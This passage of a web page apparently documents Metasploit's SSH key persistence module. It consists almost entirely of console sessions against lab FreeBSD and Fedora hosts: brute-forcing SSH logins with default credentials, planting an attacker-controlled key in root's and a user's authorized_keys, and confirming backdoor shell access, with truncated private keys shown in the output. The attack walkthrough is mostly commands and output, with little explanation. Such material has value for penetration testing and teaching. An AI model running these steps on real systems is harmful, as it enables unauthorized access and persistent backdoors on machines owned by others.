root\nmsf auxiliary(ssh_login) &gt; set password password\npassword =&gt; password\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.130\nrhosts =&gt; 192.168.2.130\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;root:password&#39; &#39;uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) FreeBSD freebsd9 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64 &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:41724 -&gt; 192.168.2.130:22) at 2016-06-19 22:10:59 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set username root\nusername =&gt; root\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[+] Pubkey set to yes\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Finding .ssh directories\n[+] Storing new private key as /root/.msf4/loot/20160619221108_default_192.168.2.130_id_rsa_441694.txt\n[*] Creating /root/.ssh/authorized_keys\n[*] Max line length is 131073\n[*] Writing 380 bytes in 1 chunks of 1461 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Verify our access works</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(sshkey_persistence) &gt; use auxiliary/scanner/ssh/ssh_login_pubkey \nmsf auxiliary(ssh_login_pubkey) &gt; set rhosts 192.168.2.130\nrhosts =&gt; 192.168.2.130\nmsf auxiliary(ssh_login_pubkey) &gt; set key_path /root/.msf4/loot/\nkey_path =&gt; /root/.msf4/loot/\nmsf auxiliary(ssh_login_pubkey) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login_pubkey) &gt; run\n\n[*] 192.168.2.130:22 SSH - Testing Cleartext Keys\n[*] SSH - Testing 4 keys from /root/.msf4/loot\n[+] SSH - Success: &#39;root:-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAqBC5XwkPOAtFn8zCFWIs3IIzUUfMvJPWxQQl1Porf8GiSs2B\n...snip...\n6aj815iPJp9X5vnIR6mRdTJP9UQraPe6jneicx8QfncfoqJbA2v7\n-----END RSA PRIVATE KEY-----\n&#39; &#39;uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) FreeBSD freebsd9 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64 &#39;\n[*] Command shell session 2 opened (192.168.2.229:32991 -&gt; 192.168.2.130:22) at 2016-06-19 22:14:16 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"fedora-20-root\" style=\"position:relative;\"><a href=\"#fedora-20-root\" aria-label=\"fedora 20 root permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fedora 20 (root)</h3>\n<p>Get Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login) &gt; set password password\npassword =&gt; password\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.143\nrhosts =&gt; 192.168.2.143\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;root:password&#39; &#39;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:35460 -&gt; 192.168.2.143:22) at 2016-06-19 20:27:53 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set user root\nuser =&gt; root\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Added User SSH Path: /root/.ssh\n[+] Storing new private key as /root/.msf4/loot/20160619202835_default_192.168.2.143_id_rsa_458964.txt\n[*] Creating /root/.ssh/authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1456 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Verify our access works</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf post(sshkey_persistence) &gt; use auxiliary/scanner/ssh/ssh_login_pubkey \nmsf auxiliary(ssh_login_pubkey) &gt; set rhosts 192.168.2.143\nrhosts =&gt; 192.168.2.143\nmsf auxiliary(ssh_login_pubkey) &gt; set key_path /root/.msf4/loot/\nkey_path =&gt; /root/.msf4/loot/\nmsf auxiliary(ssh_login_pubkey) &gt; set username root\nusername =&gt; root\nmsf auxiliary(ssh_login_pubkey) &gt; run\n\n[*] 192.168.2.143:22 SSH - Testing Cleartext Keys\n[*] SSH - Testing 2 keys from /root/.msf4/loot\n[!] No active DB -- Credential data will not be saved!\n[+] SSH - Success: &#39;root:-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAx5LLnAOPzc5KSI/Zd71bdHlexQrIpuASjUIGnJjlJVB9Sfyz\n...snip...\nvtOaL6/NsfxFDDrCBX72X5tv3rTA4MNzOFTYbCM80Ln6E2TDWgPv\n-----END RSA PRIVATE KEY-----\n&#39; &#39;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[*] Command shell session 2 opened (192.168.2.229:35751 -&gt; 192.168.2.143:22) at 2016-06-19 20:31:23 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"fedora-20-user-level\" style=\"position:relative;\"><a href=\"#fedora-20-user-level\" aria-label=\"fedora 20 user level permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Fedora 20 (user level)</h3>\n<p>Get Initial Access</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/ssh/ssh_login\nmsf auxiliary(ssh_login) &gt; set username user\nusername =&gt; user\nmsf auxiliary(ssh_login) &gt; set password password\npassword =&gt; password\nmsf auxiliary(ssh_login) &gt; set rhosts 192.168.2.143\nrhosts =&gt; 192.168.2.143\nmsf auxiliary(ssh_login) &gt; exploit\n\n[*] SSH - Starting bruteforce\n[+] SSH - Success: &#39;user:password&#39; &#39;uid=1000(user) gid=1000(user) groups=1000(user),10(wheel) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Linux localhost.homeGroup 3.11.10-301.fc20.x86_64 #1 SMP Thu Dec 5 14:01:17 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux &#39;\n[!] No active DB -- Credential data will not be saved!\n[*] Command shell session 1 opened (192.168.2.229:37727 -&gt; 192.168.2.143:22) at 2016-06-19 20:33:45 -0400\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Use the post module to write the ssh key</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf auxiliary(ssh_login) &gt; use post/linux/manage/sshkey_persistence \nmsf post(sshkey_persistence) &gt; set session 1\nsession =&gt; 1\nmsf post(sshkey_persistence) &gt; set verbose true\nverbose =&gt; true\nmsf post(sshkey_persistence) &gt; set username user\nusername =&gt; user\nmsf post(sshkey_persistence) &gt; exploit\n\n[*] Checking SSH Permissions\n[*] Authorized Keys File: .ssh/authorized_keys\n[*] Finding .ssh directories\n[+] Storing new private key as /root/.msf4/loot/20160619203401_default_192.168.2.143_id_rsa_010117.txt\n[*] Creating /home/user/.ssh/authorized_keys\n[*] Max line length is 65537\n[*] Writing 380 bytes in 1 chunks of 1452 bytes (octal-encoded), using printf\n[+] Key Added\n[!] No active DB -- Credential data will not be saved!\n[*] Post module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"63c3b097-c5b9-521c-ad4b-79d67403bb6e"}}}